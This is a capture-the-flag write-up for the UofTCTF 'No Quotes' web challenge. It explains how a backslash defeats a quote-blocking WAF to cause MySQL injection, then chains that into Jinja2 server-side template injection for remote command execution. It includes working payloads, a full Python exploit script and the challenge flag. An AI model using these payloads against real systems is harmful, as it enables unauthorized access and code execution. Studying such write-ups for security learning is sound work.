# UofTCTF – No Quotes (Write-Up)

## Challenge Overview

**No Quotes** presents itself as a straightforward login page protected by a Web Application Firewall (WAF) that blocks quote characters. 

At first glance, blocking quotes seems like an effective defense against SQL injection attacks. However, this challenge demonstrates that such assumptions can be dangerously wrong.

The solution involves chaining two vulnerabilities:
1. A SQL injection that bypasses the quote-based WAF
2. A Server-Side Template Injection (SSTI) that leads to remote code execution

Let's dive into the exploitation chain.

---

## Reconnaissance

### Analyzing the WAF

The WAF implementation is deceptively simple:
```python
def waf(value: str) -> bool:
    blacklist = ["'", '"']
    return any(char in value for char in blacklist)
```

The filter blocks single and double quotes, which are typically essential for SQL injection. However, there's a critical oversight: **the backslash character (`\\`) is not filtered**.

### Vulnerable Query Construction

The login functionality constructs a SQL query using string interpolation:
```python
query = (
    "SELECT id, username FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

User-controlled input flows directly into the query without proper sanitization. While the surrounding quotes might seem protective, they're not enough when MySQL's escape semantics come into play.

---

## Understanding MySQL Backslash Behavior

In MySQL's default configuration, the backslash character (`\`) serves as an escape character within string literals. This means:

- `\'` is interpreted as a literal single quote
- `\"` is interpreted as a literal double quote
- `\\` is interpreted as a literal backslash

Since the WAF doesn't block backslashes, we can manipulate how MySQL parses the query string, breaking out of the intended string context.

### Exploitation Concept

By injecting a backslash at the end of the username field, we can escape the closing quote that wraps our input. This causes MySQL to continue parsing into what should be the password field, allowing us to inject arbitrary SQL.

**Payload structure:**
```
username: \
password: ) UNION SELECT 1, <malicious_value>-- 
```

**Resulting query:**
```sql
SELECT id, username FROM users 
WHERE username = ('\') AND password = (') UNION SELECT 1, <malicious_value>-- ')
```

MySQL interprets `\'` as a literal quote character, so the string continues until the next unescaped quote in the password field. Our UNION statement then executes, returning controlled data.

---

## Discovering the SSTI Vulnerability

After bypassing authentication, we gain access to the `/home` endpoint. Examining the template rendering reveals a critical vulnerability:
```python
return render_template_string(
    open("templates/home.html").read() % session["user"]
)
```

Two dangerous patterns emerge:

1. **Python's `%` formatting operator** interpolates `session["user"]` directly into the template string
2. The result is then passed to `render_template_string()`, which processes Jinja2 syntax

Since `session["user"]` comes from the database (specifically, the `username` column we control via SQL injection), we can inject Jinja2 template syntax and achieve remote code execution.

---

## Crafting the Final Exploit

### SSTI Payload

To read the flag, we need to execute `/readflag`. A standard Jinja2 payload for command execution looks like:
```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}
```

### Bypassing the Quote Filter

The challenge remains: our payload contains quotes, which the WAF blocks. The solution is to construct the string using MySQL's `CHAR()` function, which converts ASCII values to characters.

For example:
- Instead of `'os'`, we use `CONCAT(CHAR(111), CHAR(115))`
- This approach eliminates the need for any quote characters

### Full Exploit Script
```python
import requests

URL = "http://172.17.0.2:5000/"
#URL = "https://no-quotes-01aae50b48d53ed7.chals.uoftctf.org/"
s = requests.Session()

def convert_to_char(payload):
    new = "CONCAT("
    for c in payload:
        new += f"CHAR({str(ord(c))}),"
    new = new[:len(new)-1]
    new += ")"
    return new

payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
print(convert_to_char(payload))


data = {"username" : "\\", "password" :  ") UNION SELECT 1," +  convert_to_char(payload) + "-- "}
 
print(s.post(URL + "login", data=data).text)

```
---

**Flag**: `uoftctf{qu0t3s_4r3_0v3rr4t3d_4nyw4ys}`